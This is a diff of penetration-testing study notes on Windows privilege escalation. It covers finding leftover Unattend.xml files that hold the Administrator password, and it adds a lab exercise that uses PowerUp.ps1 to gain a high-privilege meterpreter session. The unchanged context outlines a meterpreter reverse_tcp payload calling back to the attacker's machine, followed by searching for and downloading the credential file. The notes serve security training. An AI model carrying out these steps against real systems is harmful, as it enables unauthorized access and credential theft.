@@ -588,7 +588,7 @@ Windows Configuration Files (not third party)
 - which is used to automate the mass installation/deployment of Windows on
 - systems.
 - This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrator account’s password.
-- If the Unattended Windows Setup configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.
+- If the **Unattended Windows Setup configuration files are left** on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately.
 
 Unattended Windows Setup 
 - The Unattended Windows Setup utility configuration file, commonly known as the "unattend.xml" file, is an XML-based configuration file used in Windows operating systems to automate the installation process. It allows for unattended installations, meaning that the installation proceeds without requiring user intervention or input.
@@ -619,7 +619,7 @@ Demo - find password of administrator within a legitimate windows config file
 		- set payload windows/x64/meterpreter/reverse_tcp, LPORT 1234 LHOST kali ip 
 		- Once you go back to the victim system and you click on the payload a meterpreter session will be started in the multi/handler 
 		- sysinfo 
-		- search -f Unattend.xml    (located: C:\Windows\Panther\Unattend.xml)
+		- search -f Unattend.xml    (located: C:\\\Windows\\Panther\\Unattend.xml)
 		- cd to C:\\Windows\\Panther\\Unattend.xml
 		- dir 
 		- download unattend.xml 
@@ -636,6 +636,21 @@ Demo - find password of administrator within a legitimate windows config file
 			- whoami 
 
 Administrators often forget to delete these kind of files. Hackers can use these files to attain privileged account by getting the password from Unattended Windows Setup utility configuration file
+
+
+--- Lab ---- 
+
+Your task is to run [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) Powershell script to find a common Windows privilege escalation flaw that depends on misconfigurations.  The [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)post-exploitation framework has provided to you on the windows machine.
+
+Objective: Gain access to meterpreter session with high privileg
+
+![[Pasted image 20230707151714.png]]
+
+![[Pasted image 20230707151727.png]] Victim 
+
+![[Pasted image 20230707152325.png]]
+
+
 
 ### Dumping Hashes With mimikatz 
 
